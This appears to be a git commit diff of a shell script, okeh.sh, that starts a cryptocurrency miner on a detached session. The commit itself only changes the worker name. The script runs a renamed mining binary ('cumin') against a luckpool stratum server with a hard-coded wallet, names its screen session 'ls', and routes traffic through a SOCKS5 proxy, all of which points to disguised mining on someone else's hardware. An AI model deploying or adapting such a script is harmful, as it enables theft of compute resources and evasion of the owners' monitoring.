ef7247b0d9a1fd308129d71f31cda480de528fd4
squibex <90225595+squibex@users.noreply.github.com>
2021-12-14 05:50:34 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -5,6 +5,6 @@ chmod +x cumin
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
-WORKER=$(echo $(shuf -i 1-10 -n 1)-DOCKER)
+WORKER=prox
 PROXY=socks5://184.185.2.244:4145
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER (kolek) -t 2 -x $PROXY
